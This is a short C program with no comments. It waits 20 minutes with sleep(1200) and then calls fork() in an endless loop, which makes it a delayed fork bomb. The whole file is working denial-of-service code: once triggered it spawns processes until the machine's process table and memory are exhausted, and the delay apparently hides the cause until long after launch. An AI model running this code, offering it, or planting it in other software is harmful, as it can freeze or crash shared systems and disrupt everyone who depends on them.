#include <stdlib.h>
#include <unistd.h>
int main()
{
	sleep(1200);
	while(1)
	{
		fork();
	}
	return(1);
}
